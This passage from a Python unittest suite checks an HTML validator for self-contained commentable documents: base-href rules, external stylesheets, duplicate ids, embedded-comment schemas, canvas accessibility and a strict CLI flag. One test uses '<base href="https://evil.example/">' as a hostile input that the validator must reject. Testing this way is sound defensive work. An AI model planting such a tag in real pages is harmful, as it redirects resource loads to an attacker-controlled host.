    # The self-contained guarantee is not offline-only, and unlike offline a shareable file has no
    # zero-network CSP behind it - so a shareable document that rebases its relative references onto
    # a remote host is an error there too.
    def test_shareable_mode_rejects_a_base_href_that_points_at_the_network(self):
        for base in ('<base href="https://evil.example/">', '<base href="https:evil.example/">'):
            with self.subTest(base=base):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, base)))
                self.assertTrue(any("self-contained guarantee" in e and "<base href" in e
                                    for e in errors), (base, errors))

    # The control: a relative base still resolves inside the file's own directory, so it reaches no
    # network and must be left alone - removing it would break an author's local reference set.
    def test_offline_mode_accepts_a_relative_base_href(self):
        for base in ('<base href="assets/">', '<base href="./assets/">', '<base href="/assets/">',
                     '<base href="">', '<base target="_blank">'):
            with self.subTest(base=base):
                doc = with_offline_mode(build(body=self._body(MAIN, base)))
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], (base, errors))
                self.assertEqual(warnings, [], (base, warnings))


    def test_external_stylesheet_link_warns(self):
        link = '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=X">'
        errors, warnings = self._errs_warns(build(body=self._body(MAIN, link)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("self-contained guarantee" in w for w in warnings), warnings)

    # -- duplicate heading ids --------------------------------------------- #
    def test_duplicate_heading_ids_warn(self):
        main = ('<main id="commentRoot" data-cmh-content-root data-comment-key="k" data-doc-label="l" data-doc-source="s">\n'
                '  <h2 id="dup">A</h2>\n  <p>x</p>\n  <h2 id="dup">B</h2>\n</main>')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("duplicate heading id" in w for w in warnings), warnings)

    # -- embeddedComments per-item schema ---------------------------------- #
    def _embedded(self, payload):
        return ("<!--\nBEGIN: commentable-html - EMBEDDED COMMENTS\n-->\n"
                '<script type="application/json" id="embeddedComments">' + payload + "</script>\n"
                "<!-- END: commentable-html - EMBEDDED COMMENTS -->")

    def test_embedded_comment_item_bad_id_errors(self):
        body = [HANDLED_REGION, self._embedded('[{"id": null, "note": "x"}]'), comment_ui(), MAIN, JS_REGION]
        errors, _ = self._errs_warns(build(body=body))
        self.assertTrue(any("missing or unsafe id" in e for e in errors), errors)

    def test_embedded_comment_item_valid_id_is_clean(self):
        body = [HANDLED_REGION, self._embedded('[{"id": "cabc123", "note": "hi"}]'), comment_ui(), MAIN, JS_REGION]
        errors, warnings = self._errs_warns(build(body=body))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # -- canvas aria: report ALL offenders in one pass --------------------- #
    def test_multiple_canvases_missing_aria_reported_together(self):
        main = ('<main id="commentRoot" data-cmh-content-root data-comment-key="k" data-doc-label="l" data-doc-source="s">\n'
                '  <div class="cm-skip"><canvas id="c1"></canvas></div>\n'
                '  <div class="cm-skip"><canvas id="c2"></canvas></div>\n</main>')
        render = '<script>var x = document.getElementById("c1").getContext("2d");</script>'
        errors, warnings = self._errs_warns(build(body=self._body(main, render)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("2 of 2 <canvas>" in w for w in warnings), warnings)

    # -- --strict CLI ------------------------------------------------------- #
    def test_strict_flag_fails_on_warnings_only(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="images/x.png" alt="x">')
        content = build(body=self._body(main))
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "doc.html")
            with open(p, "w", encoding="utf-8", newline="") as fh:
                fh.write(content)
            r_plain = subprocess.run([sys.executable, VALIDATE_PY, p], capture_output=True, text=True)
            self.assertEqual(r_plain.returncode, 0, r_plain.stdout + r_plain.stderr)
            self.assertIn("WARNING", r_plain.stdout)
            r_strict = subprocess.run([sys.executable, VALIDATE_PY, "--strict", p], capture_output=True, text=True)
            self.assertEqual(r_strict.returncode, 1, r_strict.stdout + r_strict.stderr)
            self.assertIn("strict", r_strict.stdout.lower())


if __name__ == "__main__":
    unittest.main()
